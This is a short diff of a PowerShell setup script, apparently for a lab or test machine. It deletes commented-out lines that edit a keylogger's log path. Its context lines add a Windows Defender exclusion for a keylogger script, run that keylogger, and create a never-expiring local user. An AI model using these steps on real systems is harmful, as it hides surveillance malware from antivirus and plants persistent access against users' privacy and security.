@@ -15,9 +15,6 @@ Start-Sleep -s 30
 Add-MpPreference -ExclusionPath "C:\Users\setup\keylogger.ps1"
 New-Item "C:\temp\" -itemType Directory
 cd C:\Users\setup
-#(Get-Content keylogger.ps1) -replace '"C:\temp\keylogger.txt"', '"C:\Users\setup\keylogger.txt"' | Add-Content keylogger1.ps1
-#Remove-Item keylogger.ps1
-#Rename-Item keylogger1.ps1 keylogger.ps1
 ./keylogger.ps1
 $password = Read-Host -Prompt "Enter the password of your new user: " -AsSecureString
 New-LocalUser -Name "newuser" -AccountNeverExpires -Password $password
